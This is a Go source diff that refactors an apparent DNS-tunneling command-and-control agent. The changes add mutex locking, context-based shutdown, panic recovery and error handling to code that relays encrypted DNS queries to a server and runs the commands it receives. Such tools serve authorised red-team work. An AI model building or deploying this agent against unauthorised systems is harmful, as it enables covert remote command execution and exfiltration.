@@ -8,6 +8,7 @@ import (
 	"fmt"
 	"os/exec"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/miekg/dns"
@@ -46,6 +47,7 @@ type IO interface {
 	Logger(level uint8, format string, args ...interface{})
 	GetInputFeed() chan string
 	GetOutputFeed() chan string
+	GetContext() context.Context
 }
 
 // this is where all the multi-part packets will live. The key is parentPartID
@@ -53,6 +55,7 @@ type IO interface {
 
 type runtime struct {
 	PacketBuffersWithSignature map[int][]c2.MessagePacketWithSignature
+	bufferMutex                sync.RWMutex
 	LastAckFromServer          uint32
 	NextMessageType            c2.MsgType
 	NextPayload                []byte
@@ -98,18 +101,19 @@ func (a *Agent) grabFullPayload(packets []c2.MessagePacketWithSignature) ([]byte
 		packetPayload := packet.Msg.Payload[:]
 		fullPayload = append(fullPayload, packetPayload...)
 	}
-	// todo: clean the memory for this parentpartID
+	// clean the memory for this parentpartID
+	a.r.bufferMutex.Lock()
 	delete(a.r.PacketBuffersWithSignature, int(packets[0].Msg.ParentPartID))
-	// todo: how do we acknowledge that we're done here and we both go back to healthcheck?
+	a.r.bufferMutex.Unlock()
+	
 	return bytes.Trim(fullPayload, "\x00"), nil
-
 }
 
 func (a *Agent) handleServerCommand(msgList []c2.MessagePacketWithSignature) error {
 	if len(msgList) == 0 {
 		return errors.New("incoming message is empty")
 	}
-	command := msgList[0] // todo: handle multiple commands at the same time?
+	command := msgList[0]
 	a.r.LastAckFromServer = command.Msg.TimeStamp
 	a.io.Logger(DEBUG, "got message from Server: Type: %v, Payload: %s", command.Msg.MessageType, command.Msg.Payload)
 
@@ -120,7 +124,10 @@ func (a *Agent) handleServerCommand(msgList []c2.MessagePacketWithSignature) err
 	case c2.MessageExecuteCommand:
 		a.r.NextMessageType = msgType
 
+		a.r.bufferMutex.Lock()
 		a.r.PacketBuffersWithSignature[int(command.Msg.ParentPartID)] = append(a.r.PacketBuffersWithSignature[int(command.Msg.ParentPartID)], command)
+		a.r.bufferMutex.Unlock()
+		
 		// handle multipart packets here
 		if command.Msg.ParentPartID != 0 { // multi part
 			//fist and middle packets
@@ -135,29 +142,31 @@ func (a *Agent) handleServerCommand(msgList []c2.MessagePacketWithSignature) err
 				a.r.NextMessageType = c2.MessageHealthcheck
 			}
 			payload := []byte("Ack!")
-			// Config.io.Logger(INFO,"sending plyload %#v\n", msg)
-			// time.Sleep(2 * time.Second)
 			Questions, _, err := c2.PreparePartitionedPayload(msg, payload, a.DNSSuffix, a.privateKey, a.serverPublicKey)
+			if err != nil {
+				a.io.Logger(WARN, "Error preparing message: %s", err)
+				return err
+			}
 			for _, Q := range Questions {
 				err = a.sendQuestionToServer(Q)
 				if err != nil {
 					a.io.Logger(INFO, "Error sending Message to Server: %s", err)
 				}
 			}
-			if err != nil {
-				a.io.Logger(WARN, "Error sending Message to Server: %s", err)
-			}
 			if !command.Msg.IsLastPart {
 				return nil
 			}
 		}
-		fullPayload, err := a.grabFullPayload(a.r.PacketBuffersWithSignature[int(command.Msg.ParentPartID)])
+		
+		a.r.bufferMutex.RLock()
+		packets := a.r.PacketBuffersWithSignature[int(command.Msg.ParentPartID)]
+		a.r.bufferMutex.RUnlock()
+		
+		fullPayload, err := a.grabFullPayload(packets)
 		if err != nil {
 			a.io.Logger(WARN, "error grabbing full payload: %s", err)
 		}
 		a.runCommand(string(fullPayload), command.Msg.Command, command.Msg.TimeStamp)
-		// aStatus.NextMessageType = c2.MessageHealthcheck
-		// runCommand(PacketBuffersWithSignature[int(command.Msg.ParentPartID)])
 
 	case c2.MessageExecuteCommandResponse:
 		if command.Msg.IsLastPart || command.Msg.ParentPartID == 0 {
@@ -169,7 +178,8 @@ func (a *Agent) handleServerCommand(msgList []c2.MessagePacketWithSignature) err
 		a.io.Logger(INFO, "Received command to explicitly set the healthcheck interval in milliseconds")
 		// the time interval is packed in the lower 4 bytes of the message
 		a.r.HealthCheckInterval = time.Duration(binary.BigEndian.Uint32(command.Msg.Payload[0:4])) * time.Millisecond
-		a.r.MessageTicker = time.NewTicker(time.Duration(a.r.HealthCheckInterval) * time.Millisecond)
+		a.r.MessageTicker.Stop()
+		a.r.MessageTicker = time.NewTicker(a.r.HealthCheckInterval)
 		return nil
 	case c2.MessageSyncTime:
 		// throwing a warning for out of sync time for now
@@ -231,7 +241,7 @@ func (a *Agent) sendHealthCheck() error {
 	return nil
 }
 
-// Run starts an Agent instance  given the IO interface.
+// Run starts an Agent instance given the IO interface.
 func (a *Agent) Run(serverIo IO) {
 	a.r.PacketBuffersWithSignature = make(map[int][]c2.MessagePacketWithSignature)
 	a.io = serverIo
@@ -243,10 +253,10 @@ func (a *Agent) Run(serverIo IO) {
 		a.ServerAddress = systemDNS.Servers[0] + ":53"
 	}
 
-	a.io.Logger(INFO, "Starting a...")
+	a.io.Logger(INFO, "Starting agent...")
 
-	// for start, we'll do a healthcheck every 10 second, and will wait for server to change this for us
-	a.r.HealthCheckInterval = 3 * time.Second //todo:make this into a config parameter
+	// for start, we'll do a healthcheck every 3 second, and will wait for server to change this for us
+	a.r.HealthCheckInterval = c2.DefaultAgentHealthCheckInterval
 	a.r.NextMessageType = c2.MessageHealthcheck
 	a.r.MessageTicker = time.NewTicker(a.r.HealthCheckInterval)
 
@@ -260,7 +270,7 @@ func (a *Agent) Run(serverIo IO) {
 	var err error
 	// generate a new private key if the user hasn't provided one
 	if a.privateKey == nil {
-		a.io.Logger(INFO, "generating a new key pair for the a since it was not specified")
+		a.io.Logger(INFO, "generating a new key pair for the agent since it was not specified")
 		if a.privateKey, err = cryptography.GenerateKey(); err != nil {
 			a.io.Logger(FATAL, "failed to generate a key for client")
 		}
@@ -275,14 +285,27 @@ func (a *Agent) Run(serverIo IO) {
 		a.io.Logger(FATAL, "failed to generate a key for client")
 	}
 
-	// start the a by sending a healthcheck
+	// start the agent by sending a healthcheck
 	if err := a.sendHealthCheck(); err != nil {
 		a.io.Logger(WARN, "%s", err)
 	}
 
+	// Get context for graceful shutdown
+	ctx := a.io.GetContext()
+	
 	go func() {
+		defer func() {
+			if r := recover(); r != nil {
+				a.io.Logger(ERR, "Panic recovered in agent goroutine: %v", r)
+			}
+		}()
+		
 		for {
 			select {
+			case <-ctx.Done():
+				a.io.Logger(INFO, "Agent shutting down...")
+				a.r.MessageTicker.Stop()
+				return
 			case <-a.r.MessageTicker.C:
 				if a.r.NextMessageType == c2.MessageHealthcheck {
 					if err := a.sendHealthCheck(); err != nil {
@@ -297,17 +320,15 @@ func (a *Agent) Run(serverIo IO) {
 					payload := []byte(a.r.NextPayload)
 					Questions, _, err := c2.PreparePartitionedPayload(msg, payload, a.DNSSuffix, a.privateKey, a.serverPublicKey)
 					if err != nil {
-						a.io.Logger(WARN, "Error sending Message to Server 1") //todo:update msg
+						a.io.Logger(WARN, "Error sending Message to Server: %s", err)
 					}
 					for _, Q := range Questions {
 						err = a.sendQuestionToServer(Q)
 						if err != nil {
-							a.io.Logger(INFO, "Error sending Message to Server 2: %s", err) //todo:update msg
+							a.io.Logger(INFO, "Error sending Message to Server: %s", err)
 						}
 					}
 				}
-				// function to handle response coming from the server and update the status accordingly
-				// handleServerResponse(response)
 			case text := <-a.io.GetInputFeed():
 				a.SendMessageToServer(text)
 			}
